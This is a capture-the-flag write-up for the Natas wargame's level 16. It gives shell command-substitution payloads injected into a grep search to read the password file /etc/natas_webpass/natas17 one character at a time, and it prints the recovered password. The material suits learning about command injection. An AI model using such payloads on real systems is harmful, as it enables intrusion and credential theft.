# natas17

Get all characters except numbers:
$(expr substr $(cat /etc/natas_webpass/natas17) 1 1)
1.Find the common letter in the result (numbers will get no result)

Get all numbers:
a{$(($(expr substr $(cat /etc/natas_webpass/natas17) 1 1)-6))}
1.Try to modify “6” to make the result as “aa”. The real number is 8 in this example

Now, natas17:8PS3H0GWBN5RD9S7GMADGQNDKHPKQ9CW

Get the case of the letters:

```php
a{$(($(expr index $(expr substr $(grep -i Englishing dictionary.txt) 2 4) $(expr substr $(cat /etc/natas_webpass/natas17) 21 1))+0))}
```

1.Modify “21” to be the index of the letter (1 to 32)
2.Modify “Englishing” to meet the following requirement:
(1)it must be a single result (there is only one result by searching “Englishing”)
(2)it contains the letter (the 21st letter of the natas17 is G or g)
3.Modify “2” to be the previous letter of the target letter (“ngli” to G or g)
4.Try to modify “0” to “0” or “2” to make the result as “aa”. Then judge if the letter is the right case for the target letter.

Final result: natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

Note:

```php
$(expr substr $(cat /etc/natas_webpass/natas17) 5 1) #get the 5th letter of the password
a{$((1+1))} #used in grep as a regex, to find the words containing (1+1) times of “a” => “aa”
$(expr index “b” “abc”) #output the index of “b” in “abc” => 2
```

Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw